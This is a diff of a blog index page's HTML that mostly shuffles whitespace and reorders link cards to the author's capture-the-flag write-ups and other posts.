@@ -1573,82 +1369,6 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/rold/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
-      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">16 Aug 2015</time>
-      <time lang="el">16 Αυγ 2015</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1718,65 +1438,89 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1886,6 +1630,154 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
@@ -1930,6 +1822,138 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -1963,6 +1987,8 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
           
+          
+           
            
            
            
@@ -1970,15 +1996,97 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
-          
-           
-           
            
           
            
            
            
+           
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -2020,62 +2128,6 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
       <i class="fa fa-calendar"></i>
       <time lang="en">12 Apr 2018</time>
       <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
@@ -2427,6 +2479,147 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
@@ -2442,6 +2635,66 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
   </a>
 </article>
 
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
@@ -2634,231 +2887,6 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
@@ -2874,16 +2902,6 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
